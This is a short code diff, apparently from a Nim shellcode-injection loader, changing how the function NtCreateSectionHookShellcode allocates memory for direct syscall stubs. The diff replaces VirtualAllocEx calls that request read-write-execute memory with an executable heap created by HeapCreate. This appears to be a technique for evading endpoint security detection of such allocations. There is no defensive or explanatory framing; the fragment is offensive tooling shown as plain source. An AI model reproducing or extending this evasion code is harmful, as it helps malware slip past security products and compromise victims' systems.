@@ -761,10 +761,9 @@ proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
         dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
     
     when defined(GetSyscallStub):
-        when defined(DInvoke):
-            let syscallStub_NtAlloc = MyVirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-        else:
-            let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+        let syscallStub_NtAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
+        
         var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
         var oldProtection: DWORD = 0
         var success: BOOL
